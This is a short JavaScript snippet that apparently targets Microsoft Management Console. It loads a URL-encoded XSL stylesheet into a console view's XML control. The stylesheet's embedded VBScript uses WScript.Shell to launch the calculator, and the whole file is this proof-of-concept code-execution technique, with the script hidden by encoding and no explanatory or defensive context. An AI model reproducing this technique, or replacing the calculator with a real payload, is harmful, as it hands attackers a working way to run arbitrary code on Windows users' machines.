var scopeNamespace=external.Document.ScopeNamespace;
var rootNode=scopeNamespace.GetRoot();
var mainNode=scopeNamespace.GetChild(rootNode);
var docNode=scopeNamespace.GetNext(mainNode);
external.Document.ActiveView.ActiveScopeNode=docNode ;
docObject=external.Document.ActiveView.ControlObject;
external.Document.ActiveView.ActiveScopeNode=mainNode;
var XML=docObject;
XML.async=false; 
var xsl=XML;
xsl.loadXML(unescape("%3C%3Fxml%20version%3D%271%2E0%27%3F%3E%0D%0A%3Cstylesheet%0D%0A%20%20%20%20xmlns%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F1999%2FXSL%2FTransform%22%20xmlns%3Ams%3D%22urn%3Aschemas%2Dmicrosoft%2Dcom%3Axslt%22%0D%0A%20%20%20%20xmlns%3Auser%3D%22placeholder%22%0D%0A%20%20%20%20version%3D%221%2E0%22%3E%0D%0A%20%20%20%20%3Coutput%20method%3D%22text%22%2F%3E%0D%0A%20%20%20%20%3Cms%3Ascript%20implements%2Dprefix%3D%22user%22%20language%3D%22VBScript%22%3E%0D%0A%09%3C%21%5BCDATA%5B%0D%0ASet%20wshshell%20%3D%20CreateObject%28%22WScript%2EShell%22%29%0D%0AWshshell%2Erun%20%22CALC%22%0D%0A%5D%5D%3E%3C%2Fms%3Ascript%3E%0D%0A%3C%2Fstylesheet%3E"));
XML.transformNode(xsl)
